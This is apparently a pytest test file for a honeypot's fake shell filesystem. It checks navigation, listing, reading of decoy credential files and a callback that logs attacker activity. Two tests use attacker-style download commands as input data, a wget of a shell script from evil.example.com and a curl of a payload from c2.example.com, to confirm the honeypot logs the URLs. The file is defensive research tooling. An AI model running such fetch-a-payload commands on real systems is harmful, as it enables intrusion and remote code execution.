"""
tests/test_filesystem.py — Unit tests for the fake filesystem.
"""
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent))

import pytest
from honeypot.filesystem import FakeFilesystem


@pytest.fixture
def fs():
    return FakeFilesystem()


class TestNavigation:
    def test_initial_cwd_is_root(self, fs):
        assert fs.cwd == "/"

    def test_cd_absolute_path(self, fs):
        out, _ = fs.handle_command("cd /etc")
        assert fs.cwd == "/etc"
        assert out == ""

    def test_cd_relative_path(self, fs):
        fs.handle_command("cd /")
        fs.handle_command("cd etc")
        assert fs.cwd == "/etc"

    def test_cd_parent(self, fs):
        fs.handle_command("cd /etc")
        fs.handle_command("cd ..")
        assert fs.cwd == "/"

    def test_cd_home_tilde(self, fs):
        fs.handle_command("cd ~")
        assert fs.cwd == "/root"

    def test_cd_nonexistent_errors(self, fs):
        out, _ = fs.handle_command("cd /nonexistent")
        assert "No such file" in out

    def test_pwd_reflects_cwd(self, fs):
        fs.handle_command("cd /var/log")
        out, _ = fs.handle_command("pwd")
        assert "/var/log" in out


class TestListing:
    def test_ls_root_shows_dirs(self, fs):
        out, _ = fs.handle_command("ls /")
        assert "etc" in out
        assert "root" in out
        assert "var" in out

    def test_ls_hidden_files_hidden_by_default(self, fs):
        out, _ = fs.handle_command("ls /root")
        assert ".env" not in out
        assert ".bashrc" not in out

    def test_ls_a_shows_hidden(self, fs):
        out, _ = fs.handle_command("ls -a /root")
        assert ".env" in out
        assert ".bashrc" in out

    def test_ls_la_shows_permissions(self, fs):
        out, _ = fs.handle_command("ls -la /root")
        assert "rwx" in out
        assert "root" in out

    def test_ls_nonexistent_errors(self, fs):
        out, _ = fs.handle_command("ls /fakedir")
        assert "No such file" in out


class TestFileReading:
    def test_cat_existing_file(self, fs):
        out, _ = fs.handle_command("cat /etc/hostname")
        assert "ubuntu" in out

    def test_cat_passwd(self, fs):
        out, _ = fs.handle_command("cat /etc/passwd")
        assert "root" in out
        assert "ubuntu" in out

    def test_cat_nonexistent(self, fs):
        out, _ = fs.handle_command("cat /etc/fakefile")
        assert "No such file" in out

    def test_cat_directory_errors(self, fs):
        out, _ = fs.handle_command("cat /etc")
        assert "Is a directory" in out

    def test_head_limits_lines(self, fs):
        out, _ = fs.handle_command("head -3 /etc/passwd")
        lines = [l for l in out.strip().splitlines() if l]
        assert len(lines) <= 3

    def test_grep_finds_pattern(self, fs):
        out, _ = fs.handle_command("grep root /etc/passwd")
        assert "root" in out

    def test_grep_no_match_empty(self, fs):
        out, _ = fs.handle_command("grep zzznomatch /etc/passwd")
        assert out.strip() == ""


class TestDecoyFiles:
    def test_decoy_callback_fires_on_read(self, fs):
        fired = []
        fs._decoy_cb = lambda path, content: fired.append(path)
        fs.handle_command("cat /root/.env")
        assert len(fired) == 1
        assert ".env" in fired[0]

    def test_decoy_passwords_txt_readable(self, fs):
        out, _ = fs.handle_command("cat /root/passwords.txt")
        assert "MySQL" in out or "password" in out.lower()

    def test_decoy_env_has_fake_keys(self, fs):
        out, _ = fs.handle_command("cat /root/.env")
        assert "DB_PASSWORD" in out
        assert "AWS_ACCESS_KEY_ID" in out

    def test_no_callback_set_does_not_crash(self, fs):
        fs._decoy_cb = None
        out, _ = fs.handle_command("cat /root/.env")
        assert "DB_PASSWORD" in out


class TestCommands:
    def test_whoami_returns_root(self, fs):
        out, _ = fs.handle_command("whoami")
        assert "root" in out

    def test_id_returns_uid0(self, fs):
        out, _ = fs.handle_command("id")
        assert "uid=0" in out

    def test_uname_a(self, fs):
        out, _ = fs.handle_command("uname -a")
        assert "Linux" in out
        assert "x86_64" in out

    def test_find_by_name(self, fs):
        out, _ = fs.handle_command("find /root -name .env")
        assert ".env" in out

    def test_echo(self, fs):
        out, _ = fs.handle_command("echo hello world")
        assert "hello world" in out

    def test_mkdir_creates_dir(self, fs):
        fs.handle_command("cd /tmp")
        fs.handle_command("mkdir testdir")
        out, _ = fs.handle_command("ls /tmp")
        assert "testdir" in out

    def test_exit_returns_true(self, fs):
        _, is_exit = fs.handle_command("exit")
        assert is_exit is True

    def test_logout_returns_true(self, fs):
        _, is_exit = fs.handle_command("logout")
        assert is_exit is True

    def test_unknown_command_not_found(self, fs):
        out, is_exit = fs.handle_command("fakecmd123")
        assert "not found" in out
        assert is_exit is False

    def test_wget_logs_url(self, fs):
        logged = []
        fs._decoy_cb = lambda path, content: logged.append(path)
        fs.handle_command("wget http://evil.example.com/shell.sh")
        assert any("evil.example.com" in l for l in logged)

    def test_curl_logs_url(self, fs):
        logged = []
        fs._decoy_cb = lambda path, content: logged.append(path)
        fs.handle_command("curl http://c2.example.com/payload")
        assert any("c2.example.com" in l for l in logged)

    def test_which_known_binary(self, fs):
        out, _ = fs.handle_command("which wget")
        assert "/usr/bin/wget" in out

    def test_which_unknown_binary(self, fs):
        out, _ = fs.handle_command("which zzzfake")
        assert "no zzzfake" in out

    def test_env_shows_variables(self, fs):
        out, _ = fs.handle_command("env")
        assert "PATH" in out
        assert "HOME" in out
